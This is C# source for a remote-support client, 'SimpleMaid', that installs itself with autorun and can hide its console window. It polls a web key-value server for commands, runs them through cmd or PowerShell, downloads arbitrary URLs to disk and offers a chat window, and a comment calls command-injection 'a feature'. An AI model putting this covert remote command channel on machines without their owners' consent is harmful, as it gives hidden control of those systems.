using IniParser;
using IniParser.Model;
using System;
using System.Configuration;
using System.Diagnostics;
using System.Globalization;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security;
using System.Text;
using System.Threading;
using static SimpleMaid.NativeMethods;
using static SimpleMaid.PasswordStrength;

namespace SimpleMaid
{
  internal class Program
  {
    #region Properties
    public static bool Hidden { get; set; } = false;
    public static string State { set { Console.Title = $"{Application.ProductName}: {value}"; } }
    #endregion

    private static DirectoryInfo _desiredAppDirectory;
    private static FileInfo _mainConfigFile;
    private static IntPtr _handle;
    private static Mutex  _programMutex;

    #region Global threads
    private static Thread _connectionThread;
    private static Thread _commandThread;
    private static Thread _chatThread;

    private static volatile bool _busyCommandWise = false;
    private static volatile bool _busyChatWise = false;
    #endregion
    private static volatile bool _internetAlive = true;

    #region Global settings
    // TODO: Get rid of these
    private static volatile string _machine;
    private static volatile string _pass;
    #endregion

    #region Across forms
    public static frmChatWindow ChatboxWindow = null;
    public static volatile bool ChatboxExit = false;
    public static volatile string SupportChatMessage;
    public static volatile string UserChatMessage;
    public static volatile string ChatCommand;
    #endregion


    private static string Set(string tag, string value)
    {
      tag = $"{Application.ProductName}_{tag}";

      var encoding = new UTF8Encoding();
      var requestBody = encoding.GetBytes($"tag={tag}&value={value}&fmt=html");

      var request = (HttpWebRequest)WebRequest.Create($"{Variables.ServerAddress}/storeavalue");
      request.Method = "POST";
      request.Credentials = Variables.AccountCredentials;
      request.ContentType = "application/x-www-form-urlencoded";
      request.ContentLength = requestBody.Length;
      request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1";

      try
      {
        using (var requestStream = request.GetRequestStream())
        {
          requestStream.Write(requestBody, 0, requestBody.Length);
        }
      }
      catch (WebException)
      {
        reportWebError();
        _internetAlive = false;
        return resources.WebErrorMessage;
      }
      try { using (var response = request.GetResponse()) ;}
      catch (WebException)
      {
        reportWebError();
        _internetAlive = false;
        return resources.WebErrorMessage;
      }

      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Gray;
      Console.WriteLine($"SET  {tag}  {value}\n");

      return String.Empty;
    }

    private static string Get(string tag)
    {
      tag = $"{Application.ProductName}_{tag}";

      string value;

      var encoding = new UTF8Encoding();
      var requestBody = encoding.GetBytes($"tag={tag}&fmt=html");

      var request = (HttpWebRequest)WebRequest.Create($"{Variables.ServerAddress}/getvalue");
      request.Method = "POST";
      request.Credentials = Variables.AccountCredentials;
      request.ContentType = "application/x-www-form-urlencoded";
      request.ContentLength = requestBody.Length;
      request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1";

      try
      {
        using (var requestStream = request.GetRequestStream())
        {
          requestStream.Write(requestBody, 0, requestBody.Length);
        }
      }
      catch (WebException)
      {
        reportWebError();
        _internetAlive = false;
        return resources.WebErrorMessage;
      }

      // TODO: Refactor
      try
      {
        using (var response = request.GetResponse())
        using (var responseStream = response.GetResponseStream())
        using (var sr = new StreamReader(responseStream))
        {
          value = sr.ReadToEnd();
          value = value.Substring(value.IndexOf(tag, StringComparison.Ordinal) + tag.Length + 4);
          value = value.Remove(value.IndexOf("\"", StringComparison.Ordinal));
        }
      }
      catch (WebException)
      {
        reportWebError();
        _internetAlive = false;
        return resources.WebErrorMessage;
      }

      // TODO: Rewrite - problems with decoding
      value = decodeEncodedNonAsciiCharacters(value);
      value = value.Replace(@"\/", @"/");
      value = value.Replace(@"\\", @"\");
      value = WebUtility.HtmlDecode(value);

      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkGreen;
      Console.WriteLine($"GET  {tag}  {value}\n");

      return value;
    }

    private static void SetUntilSet(string tag, string value)
    {
      while (resources.WebErrorMessage == Set(tag, value))
      {
        Thread.Sleep(Variables.GeneralDelay);
      }
    }

    private static string GetUntilGet(string tag)
    {
      string value;

      while (resources.WebErrorMessage == (value = Get(tag)))
      {
        Thread.Sleep(Variables.GeneralDelay);
      }

      return value;
    }


    [STAThread]
    static void Main(string[] args)
    {
      System.Windows.Forms.Application.EnableVisualStyles();
      Console.Clear();

      #region Exit (OS/privileges check)
      if (SimplePlatform.Platform.Unix == SimplePlatform.runningPlatform())
      {
        reportGeneralError(resources.OSErrorMessage);
        exit();
      }
      else
      {
        if (SimpleApp.IsElevated())
        {
          reportGeneralError(resources.AdminErrorMessage);
          exit();
        }
      }
      #endregion

      _desiredAppDirectory = new DirectoryInfo(Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), Application.CompanyName, Application.ProductName));
      _mainConfigFile = new FileInfo(Path.Combine(_desiredAppDirectory.FullName, Variables.ConfigName));

      #region Console arguments
      bool rogueArgFound = false;
      bool autorunArgFound = false;
      bool passArgFound = false; // <-- only need it for clarity
      bool langArgFound = false; // <-- only need it for clarity

      string passArg = Variables.DefaultPassword;
      string langArg = CultureInfo.InstalledUICulture.Name;

      if (args.Length >= 1)
      {
        int adjustedLength = args.Length;

        for (int i = 0; i < args.Length; ++i)
        {
          if (!rogueArgFound && (rogueArgFound = (args[i] == Variables.RogueArgument)))
            adjustedLength--;

          if (!autorunArgFound && (autorunArgFound = (args[i] == Variables.AutorunArgument)))
            adjustedLength--;

          if (adjustedLength < 2)
            continue;

          if (!passArgFound && (args[i] == Variables.PasswordArgument))
          {
            passArg = (passArgFound = (i + 1 < adjustedLength)) ? args[i + 1] : passArg;

            if (passArgFound)
              adjustedLength -= 2;
            else
              adjustedLength--;
          }
          else if (!langArgFound && (args[i] == Variables.LanguageArgument))
          {
            langArg = (langArgFound = (i + 1 < adjustedLength)) ? args[i + 1] : langArg;

            if (langArgFound)
              adjustedLength -= 2;
            else
              adjustedLength--;
          }
        }
      }
      #endregion

      #region Hide window (if autorun)
      _handle = GetConsoleWindow();
      bool inDesiredDir = _desiredAppDirectory.IsEqualTo(Application.StartupPath);
      if (inDesiredDir || rogueArgFound)
      {
        ShowWindow(_handle, SW_HIDE);
        Program.Hidden = true;
      }
      #endregion

      // Localization
      CultureInfo.DefaultThreadCurrentUICulture = CultureInfo.GetCultureInfo(langArg);

      // TODO: Move so it happens AFTER startup directory management
      #region Exit (if already running)
      _programMutex = new Mutex(false, "Local\\" + Application.AssemblyGuid);
      if (!_programMutex.WaitOne(0, false))
      {
        reportPastSelf();
        exit();
      }
      #endregion

      #region Startup directory management
      if (!inDesiredDir)
      {
        var svtFolder = new DirectoryInfo(ConfigurationManager.AppSettings["SvtFolderName"]);
        string[] filePaths = { Application.ExecutablePath, ConfigurationManager.OpenExeConfiguration(ConfigurationUserLevel.None).FilePath,
          Assembly.GetAssembly(typeof(FileIniDataParser)).Location };
        try
        {
          svtFolder.CopyTo(_desiredAppDirectory, false);
          foreach (var filePath in filePaths)
          {
            File.Copy(filePath, Path.Combine(_desiredAppDirectory.FullName, Path.GetFileName(filePath)), true);
          }
        }
        catch //unauthorized, io, notsupported
        {
          // 1. stop other instance using guid technique
          //   if there is no other instance running, (?recursive or ?continue)
          // 2. try to copy again
          //   if unlucky, (?recursive or ?continue)
          // 3. start that instance (?with a delay through .bat file)
          // 4. exit
        }
      }
      #endregion

      #region Necessary INI declarations
      var config_parser = new FileIniDataParser();
      IniData configuration;
      #endregion

      #region Settings to read
      bool   machineConfigured = false;
      string machineName       = createMachine();
      string machinePassword   = passArg;
      bool   autoRun           = !autorunArgFound;
      #endregion

      #region Compose configuration file
      bool firstRun;
      bool promptShown = false;
      if (firstRun = !_mainConfigFile.Exists)
      {
        configuration = new IniData();

        configuration.Sections.AddSection("Service");

        configuration["Service"].AddKey("bMachineConfigured", machineConfigured.ToString());
        configuration["Service"].AddKey("sMachineName", machineName);
        #region configuration["Service"].AddKey("sMachinePassword", machinePassword);
        if (!isPasswordOK(machinePassword))
        {
          if (Program.Hidden)
            ShowWindow(_handle, SW_SHOW);

          string passwordValue;
          while (!isPasswordOK(passwordValue = new NetworkCredential(String.Empty, passwordPrompt()).Password))
          {
            reportWeakPassword(passwordValue);
          }
          configuration["Service"].AddKey("sMachinePassword", passwordValue);
          promptShown = true;

          if (Program.Hidden)
            ShowWindow(_handle, SW_HIDE);
        }
        else
        {
          configuration["Service"].AddKey("sMachinePassword", machinePassword);
        }
        #endregion
        #region configuration["Service"].AddKey("bAutoRun", autoRun.ToString());
        configuration["Service"].AddKey("bAutoRun", autoRun.ToString());
        #endregion
      }
      else
      {
        configuration = config_parser.ReadFile(_mainConfigFile.FullName, Encoding.UTF8);

        machineConfigured = bool.Parse(configuration["Service"]["bMachineConfigured"]);
        #region machineName = configuration["Service"]["sMachineName"];
        if (isNameOK(configuration["Service"]["sMachineName"]))
        {
          machineName = configuration["Service"]["sMachineName"];
        }
        else
        {
          configuration["Service"]["sMachineName"] = machineName;
          machineConfigured = false;
        }
        #endregion
        #region machinePassword = configuration["Service"]["sMachinePassword"];
        machinePassword = configuration["Service"]["sMachinePassword"];

        if (!passArgFound)
        {
          if (!isPasswordOK(machinePassword))
          {
            if (Program.Hidden)
              ShowWindow(_handle, SW_SHOW);

            string passwordValue;
            while (!isPasswordOK(passwordValue = new NetworkCredential(String.Empty, passwordPrompt()).Password))
            {
              reportWeakPassword(passwordValue);
            }
            configuration["Service"]["sMachinePassword"] = passwordValue;
            promptShown = true;
            machinePassword = configuration["Service"]["sMachinePassword"];

            if (Program.Hidden)
              ShowWindow(_handle, SW_HIDE);
          }
        }
        else
        {
          if (isPasswordOK(passArg))
          {
            configuration["Service"]["sMachinePassword"] = passArg;
            machinePassword = configuration["Service"]["sMachinePassword"];
          }
          else
          {
            if (!isPasswordOK(machinePassword))
            {
              if (Program.Hidden)
                ShowWindow(_handle, SW_SHOW);

              string passwordValue;
              while (!isPasswordOK(passwordValue = new NetworkCredential(String.Empty, passwordPrompt()).Password))
              {
                reportWeakPassword(passwordValue);
              }
              configuration["Service"]["sMachinePassword"] = passwordValue;
              promptShown = true;
              machinePassword = configuration["Service"]["sMachinePassword"];

              if (Program.Hidden)
                ShowWindow(_handle, SW_HIDE);
            }
          }
        }
        #endregion
        #region autoRun = bool.Parse(configuration["Service"]["bAutoRun"])
        if (!autorunArgFound)
        {
          autoRun = bool.Parse(configuration["Service"]["bAutoRun"]);
        }
        else
        {
          configuration["Service"]["bAutoRun"] = (!bool.Parse(configuration["Service"]["bAutoRun"])).ToString();
          autoRun = bool.Parse(configuration["Service"]["bAutoRun"]);
        }
        #endregion
      }
      #endregion

      // TODO: Get rid of these
      _machine = machineName;
      _pass = machinePassword;

      // Enable/disable autorun
      if (autoRun)
        SimpleApp.SwitchAutorun(Application.ProductName, Path.Combine(_desiredAppDirectory.FullName, Path.GetFileName(Application.ExecutablePath)));
      else
        SimpleApp.SwitchAutorun(Application.ProductName);

      #region Update INI file
      if (firstRun || !machineConfigured || autorunArgFound || passArgFound || promptShown)
      {
        if (!machineConfigured)
        {
          configureMachine();
          machineConfigured = true;
          configuration["Service"]["bMachineConfigured"] = machineConfigured.ToString();
        }

        config_parser.WriteFile(_mainConfigFile.FullName, configuration, Encoding.UTF8);
      }
      #endregion

      #region 1 - Time Thread
      var timeThread = new Thread(sendMachineTime);
      timeThread.IsBackground = true;
      timeThread.Start();
      #endregion
      Thread.Sleep(1000);

      #region 2 - Connection Thread
      _connectionThread = new Thread(handleConnection);
      _connectionThread.IsBackground = true;
      _connectionThread.Start();
      #endregion

      #region 3 - Command Thread
      _commandThread = new Thread(awaitCommands);
      _commandThread.IsBackground = true;
      // Starts in a different place
      #endregion

      #region 4 - Chat Thread
      _chatThread = new Thread(serveMessages);
      _chatThread.IsBackground = true;
      // Starts in a different place
      #endregion

      timeThread.Join();
    }


    private static void exit()
    {
      Thread.Sleep(Variables.GeneralCloseDelay);
      Environment.Exit(0);
    }

    private static string createMachine()
    {
      return Guid.NewGuid().ToString();
    }

    private static void configureMachine()
    {
      int valueLength = _machine.Length + 1; // Variables.MachinesDelimiter
      int realValueLimit = (int) Math.Floor(Variables.IndividualValueLimit / valueLength) * valueLength;

      int listIndex = -1;
      string currentList;
      do
      {
        listIndex++;
        currentList = GetUntilGet($"machines{listIndex}");
        if (currentList.Contains(_machine))
          return;
      } while (currentList.Length >= realValueLimit);

      string machines = currentList;

      SetUntilSet($"machines{listIndex}", $"{machines}{_machine}{Variables.MachinesDelimiter}");
    }

    private static bool isNameOK(string name)
    {
      Guid temp; // TODO: Waiting for C# 7.0 to turn this into one-liner
      return Guid.TryParse(name, out temp);
    }

    private static bool isPasswordOK(string password)
    {
      var strength = CheckStrength(password);

      Program.State = $"{resources.MainWindowTitle} [{nameof(PasswordStrength)}: {strength}]";

      return (strength >= Variables.MinimalPasswordStrength);
    }

    // HACK (to get the actual value, not an object): new NetworkCredential(String.Empty, passwordPrompt()).Password
    private static SecureString passwordPrompt()
    {
      Console.Clear();
      Console.CursorVisible = true;

      string middlePractical = "| " + resources.PasswordEnterTip;
      string middle = middlePractical + " |";
      middle = middlePractical + SimpleConsole.Line.GetFilled(' ').Remove(0, middle.Length) + " |";

      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.Write(middle);
      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.SetCursorPosition(middlePractical.Length, Console.CursorTop - 2);

      ConsoleKeyInfo keyInfo;
      var passHolder = new SecureString();
      int starsCount = 0;
      int middleDiff = middle.Length - middlePractical.Length;
      while ((keyInfo = Console.ReadKey(true)).Key != ConsoleKey.Enter)
      {
        if (keyInfo.Key != ConsoleKey.Backspace)
        {
          /*if (!((int)ki.Key >= 65 && (int)ki.Key <= 90))
            continue;*/ // <-- stricter, but disallows digits
          if (char.IsControl(keyInfo.KeyChar))
            continue;

          if (starsCount + 1 < middleDiff)
            ++starsCount;
          else
            continue;

          passHolder.AppendChar(keyInfo.KeyChar);

          Console.Write('*');
        }
        else
        {
          if (starsCount - 1 >= 0)
            --starsCount;
          else
            continue;

          passHolder.RemoveAt(passHolder.Length - 1);

          SimpleConsole.Line.ClearCurrent();
          Console.Write(middlePractical);
          for (int i = 0; i < starsCount; ++i)
          {
            Console.Write('*');
          }
          var pos = new Point(Console.CursorLeft, Console.CursorTop);
          Console.Write(SimpleConsole.Line.GetFilled(' ').Remove(0, middlePractical.Length + starsCount + " |".Length) + " |");
          Console.SetCursorPosition(pos.X, pos.Y);
        }

        if (starsCount == 0)
        {
          Console.Beep();
        }
        if (starsCount + 1 == middleDiff)
        {
          Console.SetCursorPosition(Console.CursorLeft - 1, Console.CursorTop);
          Console.Beep();
        }
      }

      Console.Clear();

      return passHolder;
    }

    // TODO: Get filename from Response.Header
    private static string urlToFile(string url)
    {
      return Uri.UnescapeDataString(url.Substring(url.LastIndexOf('/') + 1));
    }

    // TODO: Implement adequate decoding
    private static string decodeEncodedNonAsciiCharacters(string value)
    {
      return System.Text.RegularExpressions.Regex.Replace(value, @"\\u(?<Value>[a-zA-Z0-9]{4})", m =>
          {
            return ((char)int.Parse(m.Groups["Value"].Value, NumberStyles.HexNumber)).ToString();
          });
    }

    #region Reports
    private static void reportWeakPassword(string pas)
    {
      string middlePractical = "| " + resources.PasswordWeakHint;
      string middle = middlePractical + " |";
      middle = middlePractical + SimpleConsole.Line.GetFilled(' ').Remove(0, middle.Length) + " |";

      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.Write(middle);
      Console.Write("#" + SimpleConsole.Line.GetFilled('-').Remove(0, 2) + "#");
      Console.CursorVisible = false;

      pas = null;
      Thread.Sleep(Variables.PasswordWeakDelay);

      Console.CursorVisible = true;
    }

    private static void reportGeneralError(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Blue;
      Console.ForegroundColor = ConsoleColor.White;
      Console.WriteLine(msg + "\n");

      if (Program.Hidden)
      {
        ShowWindow(_handle, SW_SHOW);
        Console.Beep();
        Thread.Sleep(Variables.GeneralCloseDelay);
        ShowWindow(_handle, SW_HIDE);
      }
    }

    private static void reportWebError()
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkYellow;
      Console.WriteLine(resources.WebErrorMessage + "\n");
    }

    private static void reportPastSelf()
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.DarkMagenta;
      Console.WriteLine(resources.PastSins + "\n");
    }

    private static void reportThreadStart(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Cyan;
      Console.WriteLine(msg + "\n");
      if (resources.CommandStart == msg)
        Console.Beep();
    }

    private static void reportThreadStop(string msg)
    {
      Console.BackgroundColor = ConsoleColor.Black;
      Console.ForegroundColor = ConsoleColor.Red;
      Console.WriteLine(msg + "\n");
      if (resources.CommandStop == msg)
        Console.Beep();
    }
    #endregion

    private static void openChatWindow()
    {
      _busyChatWise = true;

      ChatboxWindow = new frmChatWindow();
      ChatboxWindow.ShowDialog();

      // ! code below only executes after ChatboxWindow is closed

      ChatboxExit = false;

      _busyChatWise = false;

      SetUntilSet($"commands.{_machine}", $"{Variables.AnswerPrefix}{Variables.MessageCommand},{ChatboxWindow.Visible}");
    }

    private static void closeChatWindow()
    {
      _busyChatWise = false;

      ChatboxExit = true;
    }

    private static string executeCmdCommand(string command, bool usePowershellInstead = false)
    {
      ProcessStartInfo procStartInfo;
      if (!usePowershellInstead)
      {
        procStartInfo = new ProcessStartInfo("cmd", "/c " + command);
      }
      else
      {
        procStartInfo = new ProcessStartInfo("powershell", "-command " + command);
      }

      procStartInfo.RedirectStandardOutput = true;
      procStartInfo.UseShellExecute = false;
      procStartInfo.CreateNoWindow = true;

      Process proc = new Process();
      proc.StartInfo = procStartInfo;
      proc.Start();

      string result = proc.StandardOutput.ReadToEnd();

      result = result.Replace(Environment.NewLine, @"\n");

      return result;
    }


    private static void resurrectDeadThreads()
    {
      if (null != _connectionThread && !_connectionThread.IsAlive)
      {
        _connectionThread = new Thread(handleConnection);
        _connectionThread.IsBackground = true;
        _connectionThread.Start();
      }
      if (_busyCommandWise && null != _commandThread && !_commandThread.IsAlive)
      {
        _commandThread = new Thread(awaitCommands);
        _commandThread.IsBackground = true;
        _commandThread.Start();
      }
      if (_busyChatWise && null != _chatThread && !_chatThread.IsAlive)
      {
        _chatThread = new Thread(serveMessages);
        _chatThread.IsBackground = true;
        _chatThread.Start();
      }
    }

    private static void sendMachineTime()
    {
      reportThreadStart(resources.TimeStart);

      while (true)
      {
        var now = DateTime.Now;

        if (resources.WebErrorMessage != Set($"time.{_machine}" /* PUN NOT INTENDED */, $"{now.ToShortDateString()} {now.ToLongTimeString()}"))
        {
          if (!_internetAlive)
            resurrectDeadThreads();

          _internetAlive = true;
        }

        Thread.Sleep(Variables.GeneralDelay - now.Millisecond);
      }
    }

    private static void handleConnection()
    {
      reportThreadStart(resources.ConnectionStart);

      while (_internetAlive)
      {
        if (Get(_machine) == _pass)
        {
          _busyCommandWise = !_busyCommandWise;
          SetUntilSet(_machine, String.Empty);

          if (_busyCommandWise && null != _commandThread && !_commandThread.IsAlive)
          {
            _commandThread = new Thread(awaitCommands);
            _commandThread.IsBackground = true;
            _commandThread.Start();
          }
        }

        Thread.Sleep(Variables.GeneralDelay);
      }

      reportThreadStop(resources.ConnectionStop);
    }

    // TODO: Resolve colission - user and support sending messages simultaneously
    private static void serveMessages()
    {
      reportThreadStart(resources.ChatStart);

      string ans = Variables.AnswerPrefix;
      char sep = Variables.CommandsSeparator;

      string sRemoteMessage = null;
      string sPreviousRemoteMessage = null;

      while (_busyChatWise && _internetAlive)
      {
        if (sRemoteMessage != null)
          Thread.Sleep(Variables.GeneralDelay);

        sRemoteMessage = GetUntilGet("messages." + _machine);

        if (!String.IsNullOrWhiteSpace(UserChatMessage))
        {
          SetUntilSet("messages." + _machine, ans + UserChatMessage);
          UserChatMessage = null;
        }

        if (sRemoteMessage == sPreviousRemoteMessage || String.Empty == sRemoteMessage || sRemoteMessage.StartsWith(ans))
          continue;

        sPreviousRemoteMessage = sRemoteMessage;

        // TODO: частный случай m, ещё две то есть
        // TODO: ChatCommand = message_aprts[1];
        #region Parsing message
        string[] message_parts = sRemoteMessage.Split(new char[] { sep }, StringSplitOptions.RemoveEmptyEntries);

        SupportChatMessage = message_parts[0];
        #endregion
      }

      reportThreadStop(resources.ChatStop);
    }

    private static void awaitCommands()
    {
      reportThreadStart(resources.CommandStart);

      string ans = Variables.AnswerPrefix;
      char sep = Variables.CommandsSeparator;

      string sRemoteCommand = null;

      while (_busyCommandWise && _internetAlive)
      {
        if (sRemoteCommand != null)
          Thread.Sleep(Variables.GeneralDelay);

        sRemoteCommand = GetUntilGet("commands." + _machine);

        if (String.Empty == sRemoteCommand || sRemoteCommand.StartsWith(ans))
          continue;

        #region Parsing command
        string[] command_parts = sRemoteCommand.Split(new char[] { sep }, StringSplitOptions.RemoveEmptyEntries);

        bool isCommandSpecial = (command_parts[0] != sRemoteCommand);

        if (!isCommandSpecial)
        {
          SetUntilSet("commands." + _machine, ans + executeCmdCommand(command_parts[0]));
        }
        else
        {
          char specialCommandIdentifier = command_parts[0].ToCharArray()[0];

          switch (specialCommandIdentifier)
          {
            case Variables.QuitCommand:
              SetUntilSet("commands." + _machine, ans + Variables.GeneralOKMsg);
              exitCommand();
              break;

            case Variables.HideCommand:
              SetUntilSet("commands." + _machine, ans + hideCommand());
              break;

            case Variables.ShowCommand:
              SetUntilSet("commands." + _machine, ans + showCommand());
              break;

            case Variables.DownloadCommand:
              SetUntilSet("commands." + _machine, ans + downloadCommand(command_parts));
              break;

            case Variables.MessageCommand:
              SetUntilSet("commands." + _machine, ans + messageCommand(command_parts));
              break;

            case Variables.PowershellCommand:
              SetUntilSet("commands." + _machine, ans + powershellCommand(command_parts));
              break;

            case Variables.RepeatCommand:
              if (command_parts.Length < 2)
                goto default;

              string[] command_parts_fixed = new string[command_parts.Length - 1];
              for (int i = 1; i < command_parts.Length; ++i)
              {
                command_parts_fixed[i - 1] = command_parts[i];
              }

              bool isRepeatCommandSpecial = ($"{command_parts[0]}{sep}{command_parts_fixed[0]}" != sRemoteCommand);

              if (!isRepeatCommandSpecial)
              {
                executeCmdCommand(command_parts_fixed[0]);
              }
              else
              {
                char specialRepeatCommandIdentifier = command_parts_fixed[0].ToCharArray()[0];

                switch (specialRepeatCommandIdentifier)
                {
                  case Variables.QuitCommand:
                    exitCommand();
                    break;

                  case Variables.PowershellCommand:
                    powershellCommand(command_parts_fixed);
                    break;

                  default:
                    reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
                    break;
                }
              }
              break;

            default:
              reportGeneralError(resources.WrongCommandErrMsg + sRemoteCommand);
              break;
          }
        }
        #endregion
      }

      reportThreadStop(resources.CommandStop);
    }


    private static void exitCommand()
    {
      Environment.Exit(0);
    }

    private static string hideCommand()
    {
      if (Program.Hidden) return Variables.GeneralOKMsg;

      ShowWindow(_handle, SW_HIDE);
      Program.Hidden = true;

      return Variables.GeneralOKMsg;
    }

    private static string showCommand()
    {
      if (!Program.Hidden) return Variables.GeneralOKMsg;

      ShowWindow(_handle, SW_SHOW);
      Program.Hidden = false;

      return Variables.GeneralOKMsg;
    }

    private static string downloadCommand(string[] command_parts)
    {
      if (command_parts.Length < 2)
      {
        return Variables.IncompleteCommandErrMsg;
      }

      string downloadDirPath = null;
      string downloadFileName = null;

      bool quickDownload;
      if ((quickDownload = (command_parts.Length == 2)) || Variables.KeywordDefault == command_parts[2])
      {
        downloadDirPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
        downloadFileName = urlToFile(command_parts[1]);
      }
      // TODO: Атаки типа "& && ||" - не баг, а фича!
      else if (command_parts.Length >= 3)
      {
        string ev = Variables.EvaluateCmdVariable;
        char evd = char.Parse(Variables.EvaluateCmdVariableEnd);

        if (command_parts[2].Contains(ev))
        {
          var indexesOfCmdVariables = command_parts[2].AllIndexesOf(ev);

          int diff = 0;
          foreach (int index in indexesOfCmdVariables)
          {
            string variable = command_parts[2].Pacmanise(index + ev.Length - diff, evd);

            /*if (variable.Contains(" "))
            {
              reportGeneralError(resources.OldnewErrorMessage);
              return;
            }*/

            string unEvaluatedVariable = ev + variable + evd;
            string evaluatedVariable = executeCmdCommand($"echo {variable}");

            command_parts[2] = command_parts[2].Replace(unEvaluatedVariable, evaluatedVariable);

            diff += unEvaluatedVariable.Length - evaluatedVariable.Length;
          }
        }

        downloadDirPath = Path.GetDirectoryName(command_parts[2]);
        downloadFileName = Path.GetFileName(command_parts[2]);
      }

      Directory.CreateDirectory(downloadDirPath);

      // TODO: Use my FTP
      string downloadFilePath = Path.Combine(downloadDirPath, downloadFileName);
      using (var wc = new WebClient())
      {
        try
        {
          wc.DownloadFile(new Uri(command_parts[1]), downloadFilePath);
        }
        catch (Exception exc)
        {
          return exc.Message;
        }
      }

      if (quickDownload)
        Process.Start(downloadDirPath);

      return downloadFilePath;
    }

    private static string messageCommand(string[] command_parts)
    {
      if (ChatboxWindow == null || ChatboxWindow.IsDisposed)
      {
        #region 3.5 - ChatBox Thread
        var chatboxThread = new Thread(openChatWindow);
        chatboxThread.IsBackground = true;
        chatboxThread.Start();
        #endregion

        while (null == ChatboxWindow || !ChatboxWindow.Visible)
        {
          Thread.Sleep(1000);
        }

        #region 4 - Chat Thread
        if (_busyChatWise && null != _chatThread && !_chatThread.IsAlive)
        {
          _chatThread = new Thread(serveMessages);
          _chatThread.IsBackground = true;
          _chatThread.Start();
        }
        #endregion
      }
      else
      {
        closeChatWindow();
      }

      return $"{Variables.MessageCommand},{ChatboxWindow.Visible}";
    }

    private static string powershellCommand(string[] command_parts)
    {
      if (command_parts.Length < 2)
      {
        return Variables.IncompleteCommandErrMsg;
      }

      for (int i = 2; i < command_parts.Length; ++i)
      {
        command_parts[1] += "; " + command_parts[i];
      }
      command_parts[1] = command_parts[1].Replace(@"""", @"\""");

      return executeCmdCommand(command_parts[1], true);
    }
  }
}
